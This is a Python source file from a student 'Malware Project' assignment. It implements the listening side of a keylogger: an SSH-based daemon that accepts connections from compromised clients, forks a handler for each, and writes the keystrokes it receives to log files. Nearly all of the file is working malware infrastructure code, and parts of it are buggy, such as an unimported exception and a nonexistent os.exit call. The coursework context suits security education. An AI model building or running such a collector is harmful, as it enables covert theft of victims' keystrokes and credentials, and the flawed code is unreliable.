#!/usr/bin/env python
#utf-8
#==============================================================================
#   Assignment:  Malware Project
#
#       Author:  Darien, Alexi
#     Language:  Python3
#   To Compile:  N/A, Python is not a compiled language
#
#         Class:  DPI 912
#       Professor:  Harvey Kaduri
#     Due Date:: April 17h, 2020 - 5:00 pm
#   Submitted:  April 17th, 2020 - 4:50 pm
#
#-----------------------------------------------------------------------------
#
#  Description:  A reverse Daemon capable of receiving and logging many client connections containing keylog information.
#
#        Input:  N/A
#
#       Output:  N/A
#
#    Algorithm:  When run, this Daemon will actively await and trigger for successful connections. It will fork a child that will track
#       key logs of any client attacked to that fork.
#
#   Required Features Not Included:  N/A
#
#   Known Bugs:  N/A
#
#   Classification: Daemon
#
#==============================================================================

import socket
import paramiko
import threading
import os
import sys
import config as config
import time
import datetime

#script args
server_address = config.host
server_port = int(config.port)
server_username = config.user
server_password = config.code
server_host_key = paramiko.RSAKey(filename=config.sshp + "id_rsa")
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#ssh server parameters defined in the class
class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_auth_password(self, username, password):
        if username == server_username and password == server_password:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
#ssh client handler
def client_handler(client_socket,  PID):
    try:
        #bind client socket to ssh server session and add rsa key
        ssh_session = paramiko.Transport(client_socket)
        ssh_session.add_server_key(server_host_key)
        server = Server()
#start the ssh server and negotiate ssh params
        try:
            ssh_session.start_server(server=server)
        except SSHException as err:
            print(f"{PID} [!] SSH Parameters Negotiation Failed")
        print(f"{PID} [*] SSH Parameters Negotiation Succeeded")
#authenticate the client
        print(f"{PID} [*] Authenticating")
        ssh_channel = ssh_session.accept(20)
        if ssh_channel == None or not ssh_channel.active:
            print(f"{PID} [*] SSH Client Authentication Failure")
            ssh_session.close()
        else:
            print("[*] SSH Client Authenticated")
            f = open(str(PID) + " " + str(datetime.date.today()) + ".txt", "a+")
#ssh channel is established. We can start the shell
            def routine(command):
                ssh_channel.send(command)
                if command == "exit":
                    print("[*] Exiting")
                    try:
                        ssh_session.close()
                        f.close()
                    except:
                        print(f"{PID} [!] Error closing SSH session")
                    print(f"{PID} [*] SSH session closed")
                recv = ssh_channel.recv(1024).decode('utf-8') + '\n'
                f.write(recv)
                f.flush()
                os.fsync(f.fileno())
            time.sleep(1)
            while not ssh_channel.closed:
                try:
                    routine("process")
                except:
                    print(f"{PID} [!] Cannot exit! Child still active!")
    except Exception as err:
        print(f"{PID} [*] Caught Exception: ", str(err))
        print(f"{PID} [*] Exiting Script")
        try:
            ssh_session.close()
        except:
            print(f"{PID} [!] Error closing SSH session")
        print(f"{PID} [*] SSH session closed")
        sys.exit(1)
#ssh server bind and listen
try:
    print(f"[*] Attempting bind on {server_address}:{server_port}")
    server_socket.bind((server_address, server_port))
except:
    print(f"[!] Bind Error for SSH Server using {server_address}:{server_socket.getsockname()[1]}, port {server_port} may be unavailable")
    sys.exit(1)
print(f"[*] Bind Success for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
server_socket.listen(100)
print("[*] Listening")
#Keep ssh server active and accept incoming tcp connections
while True:
    client_socket, addr = server_socket.accept()
    clientPID = os.fork()
    if clientPID != 0:
        print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}, assigned PID {clientPID}")
        client_handler(client_socket,  clientPID)
        client_socket.close()
        os.waitpid(clientPID,  0)
        os.exit(0)
    
